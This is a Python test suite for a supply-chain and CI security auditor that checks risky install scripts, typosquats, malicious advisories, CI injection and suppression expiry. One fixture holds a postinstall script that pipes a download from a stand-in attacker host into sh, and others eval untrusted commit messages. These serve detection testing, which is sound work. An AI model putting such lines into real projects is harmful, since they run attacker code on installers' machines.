"""
ADR-0022: ideas from GuardDog, OpenSSF Scorecard, poutine, OSV-Scanner, DefectDojo, Dependency-Track and PR-Agent,
implemented in Centinela's own code. Pure logic is tested directly; the suppression lifecycle runs against the disposable
test database (scripts/run_tests.sh) and cleans up after itself.
"""
import json
import os
import subprocess
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

from auditors import auditor_gitlab_config as gc
from auditors import auditor_sca_dependencies as sca
from auditors import sbom_export
from auditors import supply_chain_rules as scr
from auditors.mr_review import linked_issues


def _rules(findings):
    return [f[0] if isinstance(f, tuple) else f["cve_id"] for f in findings]


class TestSupplyChainRules(unittest.TestCase):
    def test_install_script_downloading_code_is_flagged_but_echo_is_not(self):
        bad = json.dumps({"name": "x", "scripts": {"postinstall": "curl -s https://evil.example/p.sh | sh"}}, indent=2)
        ok = json.dumps({"name": "x", "scripts": {"postinstall": "echo 'docs at https://example.com'"}}, indent=2)
        self.assertIn("SUPPLY-CHAIN-INSTALL-SCRIPT-RISKY", _rules(scr.evaluate_package_json(bad)))
        self.assertEqual(_rules(scr.evaluate_package_json(ok)), [])

    def test_url_dependencies_need_a_full_commit(self):
        sha = "a" * 40
        pkg = json.dumps({"dependencies": {
            "lib-a": "github:org/lib-a", "lib-b": f"git+https://host/org/lib-b.git#{sha}", "lib-c": "^1.2.3",
            "lib-d": "file:../lib-d", "lib-e": "org/lib-e#develop"}}, indent=2)
        names = [d for r, _s, _l, d in scr.evaluate_package_json(pkg) if r == "SUPPLY-CHAIN-DEPENDENCY-FROM-URL"]
        self.assertEqual(len(names), 2)
        self.assertTrue(any("lib-a" in d for d in names) and any("lib-e" in d for d in names))

    def test_credentials_in_dependency_urls_never_reach_the_finding_text(self):
        pkg = json.dumps({"dependencies": {"lib": "git+http://oauth2:EXAMPLEVALUE123@192.0.2.2/g/lib.git#main"}}, indent=2)
        texts = " ".join(d for _r, _s, _l, d in scr.evaluate_package_json(pkg))
        self.assertNotIn("EXAMPLEVALUE", texts)
        self.assertIn("***@", texts)
        req = "git+https://user:pw-SECRET@host/r.git\n"
        self.assertNotIn("pw-SECRET", " ".join(d for _r, _s, _l, d in scr.evaluate_requirements(req)))

    def test_lockfile_over_http_is_one_grouped_finding(self):
        lock = '\n'.join(['{', '"resolved": "http://registry.local/a.tgz",', '"resolved": "https://registry.npmjs.org/b.tgz",',
                          '"resolved": "http://registry.local/c.tgz"', '}'])
        out = scr.evaluate_lockfile(lock, "package-lock.json")
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0][2], 2)
        self.assertIn("2 paquete", out[0][3])

    def test_typosquat_detection_and_known_legitimate_neighbours(self):
        self.assertEqual(scr.typosquat_target("lodahs", "npm"), "lodash")
        self.assertEqual(scr.typosquat_target("reqeusts", "pypi"), "requests")
        for legit in ("tslint", "preact", "lodash", "@acme/lodahs", "vue"):
            self.assertIsNone(scr.typosquat_target(legit, "npm"), legit)
        for legit in ("psycopg", "pymssql", "python_dateutil", "requests"):
            self.assertIsNone(scr.typosquat_target(legit, "pypi"), legit)


class TestScaMaliciousAndUpgrade(unittest.TestCase):
    def test_malicious_advisory_detection(self):
        self.assertTrue(sca.is_malicious_advisory({"id": "MAL-2025-1234"}))
        self.assertTrue(sca.is_malicious_advisory({"id": "GHSA-xxxx", "aliases": ["MAL-2024-9"]}))
        self.assertFalse(sca.is_malicious_advisory({"id": "GHSA-xxxx", "aliases": ["CVE-2024-1"]}))

    def test_minimal_safe_version(self):
        self.assertEqual(sca.minimal_safe_version(["1.2.3", "1.10.0", "1.9.9"]), ("1.10.0", True))
        self.assertEqual(sca.minimal_safe_version(["2.0.1", "ver aviso original"]), ("2.0.1", False))
        self.assertEqual(sca.minimal_safe_version(["ver aviso original"]), ("", False))

    def test_osv_results_get_one_upgrade_note_and_malicious_stays_critical(self):
        class Resp:
            def __init__(self, data):
                self._d = data

            def raise_for_status(self):
                return None

            def json(self):
                return self._d

        details = {
            "GHSA-1": {"id": "GHSA-1", "aliases": ["CVE-2025-1"], "summary": "a",
                       "affected": [{"package": {"ecosystem": "npm", "name": "axios"},
                                     "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "1.8.2"}]}]}]},
            "GHSA-2": {"id": "GHSA-2", "aliases": ["CVE-2025-2"], "summary": "b",
                       "affected": [{"package": {"ecosystem": "npm", "name": "axios"},
                                     "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "1.12.0"}]}]}]},
            "MAL-2025-7": {"id": "MAL-2025-7", "summary": "malware"},
        }
        orig_post, orig_get = sca.requests.post, sca.requests.get
        vulnerable = {("axios", "1.6.0"): ["GHSA-1", "GHSA-2"], ("evil-pkg", "1.0.0"): ["MAL-2025-7"]}

        def fake_post(url, json=None, **k):     # answers per queried (package, version), like the real API
            return Resp({"results": [{"vulns": [{"id": i} for i in vulnerable.get((q["package"]["name"], q["version"]), [])]}
                                     for q in json["queries"]]})
        sca.requests.post = fake_post
        sca.requests.get = lambda url, **k: Resp(details[url.rsplit("/", 1)[1]])
        try:
            out = sca._findings_from_osv({"axios": ("1.6.0", 3), "evil-pkg": ("1.0.0", 4)}, "npm", "package.json", "/r/package.json")
        finally:
            sca.requests.post, sca.requests.get = orig_post, orig_get
        ax = [f for f in out if f["package"] == "axios"]
        self.assertEqual(len(ax), 2)
        self.assertTrue(all("1.12.0" in f["upgrade_note"] and "2 avisos" in f["upgrade_note"] for f in ax))
        mal = [f for f in out if f["package"] == "evil-pkg"]
        self.assertEqual(len(mal), 1)
        self.assertEqual(mal[0]["severity"], "CRITICAL")
        self.assertTrue(mal[0]["malicious"])
        self.assertEqual(mal[0]["fixed_version"], sca.MALICIOUS_FIXED_VERSION)


class TestUpgradeTargetVerification(unittest.TestCase):
    def _run(self, answers):
        orig = sca.query_osv_batch
        sca.query_osv_batch = lambda deps, eco: answers(deps)
        try:
            return sca.verify_upgrade_targets({"lib": "2.0.0"}, "npm")
        finally:
            sca.query_osv_batch = orig

    def test_clean_target(self):
        self.assertEqual(self._run(lambda deps: {}), {"lib": ("2.0.0", "clean")})

    def test_target_moves_up_when_still_affected_on_its_own_line(self):
        def answers(deps):
            (name, ver), = deps
            return {("lib", "2.0.0"): [{"fixed_version": "2.3.0"}]}.get((name, ver)) and {(name, ver): [{"fixed_version": "2.3.0"}]} or {}
        self.assertEqual(self._run(answers), {"lib": ("2.3.0", "clean")})

    def test_never_moves_down_and_osv_down_is_unverified(self):
        self.assertEqual(self._run(lambda deps: {deps[0]: [{"fixed_version": "1.5.0"}]}), {"lib": ("2.0.0", "still_vulnerable")})
        self.assertEqual(self._run(lambda deps: None), {"lib": ("2.0.0", "unverified")})


class TestAutofixRefusesNonVersions(unittest.TestCase):
    def test_bump_patch_refuses_text_that_is_not_a_version(self):
        from remediation import gitlab_autofix
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "requirements.txt"), "w") as fh:
                fh.write("flask==0.12\n")
            for fixed in ("ver aviso original", sca.MALICIOUS_FIXED_VERSION):
                vuln = {"url_path": "requirements.txt:1",
                        "description": f"**Paquete:** flask\n**Versión instalada:** 0.12\n**Versión segura:** {fixed}\n"
                                       f"**Manifiesto:** requirements.txt\n"}
                ok, msg = gitlab_autofix.patch_dependency_bump(d, vuln)
                self.assertFalse(ok)
                self.assertIn("manual", msg)
            with open(os.path.join(d, "requirements.txt")) as fh:
                self.assertEqual(fh.read(), "flask==0.12\n")


class TestCiRules(unittest.TestCase):
    def test_untrusted_input_only_when_reparsed(self):
        ci = "j:\n  script:\n    - eval \"echo $CI_COMMIT_MESSAGE\"\n    - echo \"$CI_COMMIT_MESSAGE\"\n    - sh -c \"x ${CI_COMMIT_REF_NAME}\"\n"
        hits = [f["url_path"] for f in gc.evaluate_ci_file(ci) if f["cve_id"] == "CICD-UNTRUSTED-INPUT-INJECTION"]
        self.assertEqual(hits, [".gitlab-ci.yml:3", ".gitlab-ci.yml:5"])

    def test_inputs_interpolation_unless_escaped(self):
        ci = "j:\n  script:\n    - deploy $[[ inputs.env ]]\n    - deploy $[[ inputs.env | posix_escape ]]\n"
        self.assertEqual(_rules([f for f in gc.evaluate_ci_file(ci) if f["cve_id"].startswith("CICD-INPUT")]),
                         ["CICD-INPUT-INTERPOLATION-IN-SCRIPT"])

    def test_include_without_ref_but_not_trigger(self):
        cases = {
            "include:\n  - project: g/t\n    file: a.yml\n": 1,
            "include:\n  - project: g/t\n    ref: v1\n    file: a.yml\n": 0,
            "include:\n  - project: g/a\n    ref: v1\n  - project: g/b\n    file: b.yml\n": 1,
            "include:\n  project: g/t\n  ref: abc\n": 0,
            "deploy:\n  trigger:\n    project: g/down\n": 0,
        }
        for text, n in cases.items():
            got = [f for f in gc.evaluate_ci_file(text) if f["cve_id"] == "CICD-INCLUDE-UNPINNED"]
            self.assertEqual(len(got), n, text)

    def test_install_not_frozen(self):
        ci = "j:\n  script:\n    - npm install\n    - npm ci\n    - yarn install --frozen-lockfile\n    - yarn install\n"
        hits = [f["url_path"] for f in gc.evaluate_ci_file(ci) if f["cve_id"] == "CICD-DEPENDENCY-INSTALL-NOT-FROZEN"]
        self.assertEqual(hits, [".gitlab-ci.yml:3", ".gitlab-ci.yml:6"])


class TestCommittedBinaries(unittest.TestCase):
    def test_classification_excludes_build_wrappers(self):
        got = gc.classify_committed_binaries([
            "gradle/wrapper/gradle-wrapper.jar", "Svc/.mvn/wrapper/maven-wrapper.jar", "lib/axis.jar",
            "db/changelog/key_inicial.bin", "app/__pycache__/m.cpython-311.pyc", "target/app.jar", "src/Main.java"])
        self.assertEqual(sorted(got["artifacts"]), ["db/changelog/key_inicial.bin", "lib/axis.jar"])
        self.assertEqual(sorted(got["build_output"]), ["app/__pycache__/m.cpython-311.pyc", "target/app.jar"])

    def test_repo_tree_uses_tracked_files_only(self):
        with tempfile.TemporaryDirectory() as d:
            env = {**os.environ, "GIT_CONFIG_GLOBAL": "/dev/null"}
            subprocess.run(["git", "init", "-q", d], check=True, env=env)
            os.makedirs(os.path.join(d, "lib"))
            with open(os.path.join(d, "lib", "tool.jar"), "wb") as fh:
                fh.write(b"PK\x03\x04")
            with open(os.path.join(d, "untracked.exe"), "wb") as fh:
                fh.write(b"MZ")
            subprocess.run(["git", "-C", d, "add", "lib/tool.jar"], check=True, env=env)
            out = gc.evaluate_repo_tree(d)
        self.assertEqual(_rules(out), ["REPO-BINARY-ARTIFACT"])
        self.assertIn("lib/tool.jar", out[0]["description"])
        self.assertNotIn("untracked.exe", out[0]["description"])

    def test_not_a_repository_is_not_evaluated(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertIsNone(gc.evaluate_repo_tree(d))


class TestSbom(unittest.TestCase):
    def test_path_is_stable_and_safe(self):
        a = sbom_export.sbom_path("GitLab/grupo/proy@main")
        self.assertEqual(a, sbom_export.sbom_path("GitLab/grupo/proy@main"))
        self.assertNotEqual(a, sbom_export.sbom_path("GitLab/grupo/proy@develop"))
        self.assertNotIn("/grupo/", a[len(sbom_export.SBOM_DIR):])

    def test_find_component_across_stored_sboms(self):
        with tempfile.TemporaryDirectory() as d:
            for asset, comps in (("A", [{"name": "log4j-core", "group": "org.apache.logging.log4j", "version": "2.14.1"}]),
                                 ("B", [{"name": "log4j-core", "group": "org.apache.logging.log4j", "version": "2.17.1"}])):
                with open(os.path.join(d, f"{asset}.cdx.json"), "w") as fh:
                    json.dump({"bomFormat": "CycloneDX", "components": comps,
                               "metadata": {"properties": [{"name": "centinela:asset", "value": asset}]}}, fh)
            self.assertEqual(len(sbom_export.find_component("log4j-core", sbom_dir=d)), 2)
            hits = sbom_export.find_component("org.apache.logging.log4j/log4j-core", "2.14.1", sbom_dir=d)
            self.assertEqual([h["asset"] for h in hits], ["A"])


class TestMrTraceability(unittest.TestCase):
    def test_linked_issues(self):
        self.assertEqual(linked_issues("Fix", "Closes #12, ver grupo/proy#7"), ["#12", "grupo/proy#7"])
        self.assertEqual(linked_issues("PROY-123 ajuste", ""), ["PROY-123"])
        self.assertEqual(linked_issues("Sube dependencia", "Corrige CVE-2024-1234 (CWE-79)"), [])
        self.assertEqual(linked_issues("x", "```\n#99\n```"), [])


class TestSuppressionLifecycle(unittest.TestCase):
    CVE = "TEST-SUPPRESSION-LIFECYCLE"

    def tearDown(self):
        from core.db_manager import get_db_cursor
        with get_db_cursor() as cur:
            cur.execute("DELETE FROM vulnerability_log WHERE cve_id = %s", (self.CVE,))
            cur.execute("DELETE FROM finding_suppressions WHERE cve_id = %s", (self.CVE,))

    def test_expiry_policy(self):
        from core import suppression_lifecycle as sl
        now = datetime(2026, 1, 1, tzinfo=timezone.utc)
        with self.assertRaises(sl.SuppressionPolicyError):
            sl.validate_expiry("ACCEPTED_RISK", None, now)
        with self.assertRaises(sl.SuppressionPolicyError):
            sl.validate_expiry("ACCEPTED_RISK", (now + timedelta(days=sl.ACCEPTED_RISK_MAX_DAYS + 1)).isoformat(), now)
        with self.assertRaises(sl.SuppressionPolicyError):
            sl.validate_expiry("FALSE_POSITIVE", (now - timedelta(days=1)).isoformat(), now)
        self.assertIsNone(sl.validate_expiry("FALSE_POSITIVE", None, now))
        self.assertEqual(sl.validate_expiry("ACCEPTED_RISK", "2026-03-01T00:00:00Z", now),
                         datetime(2026, 3, 1, tzinfo=timezone.utc))

    def test_expired_acceptance_reopens_its_findings_unless_another_suppression_covers_them(self):
        from core import suppression_lifecycle as sl
        from core.db_manager import get_db_cursor
        from core.deduplication_engine import log_finding_deduplicated
        with get_db_cursor() as cur:
            _a, v1 = log_finding_deduplicated(cur, None, self.CVE, "HIGH", "one", "test-verification", url_path="a.py:1")
            _a, v2 = log_finding_deduplicated(cur, None, self.CVE, "HIGH", "two", "test-verification", url_path="b.py:2")
            cur.execute("UPDATE vulnerability_log SET status = 'SUPPRESSED' WHERE id IN (%s, %s)", (v1, v2))
            cur.execute("""INSERT INTO finding_suppressions (cve_id, reason, scope, created_by, expires_at)
                           VALUES (%s, 'aceptado', 'ACCEPTED_RISK', 'pytest', NOW() + INTERVAL '1 day') RETURNING id""", (self.CVE,))
            sid = cur.fetchone()[0]
            cur.execute("""INSERT INTO finding_suppressions (cve_id, url_path_pattern, reason, scope, created_by)
                           VALUES (%s, 'b.py%%', 'falso positivo', 'FALSE_POSITIVE', 'pytest')""", (self.CVE,))
        with get_db_cursor() as cur:
            self.assertEqual(sl.expire_due(cur)["expired"], 0)       # not due yet
            cur.execute("UPDATE finding_suppressions SET expires_at = NOW() - INTERVAL '1 minute' WHERE id = %s", (sid,))
        with get_db_cursor() as cur:
            stats = sl.expire_due(cur)
        self.assertGreaterEqual(stats["expired"], 1)
        with get_db_cursor() as cur:
            cur.execute("SELECT id, status FROM vulnerability_log WHERE id IN (%s, %s)", (v1, v2))
            status = {str(r[0]): r[1] for r in cur.fetchall()}
            cur.execute("SELECT active FROM finding_suppressions WHERE id = %s", (sid,))
            self.assertFalse(cur.fetchone()[0])
        self.assertEqual(status[str(v1)], "OPEN")
        self.assertEqual(status[str(v2)], "SUPPRESSED", "still covered by the false-positive suppression")


if __name__ == "__main__":
    unittest.main()
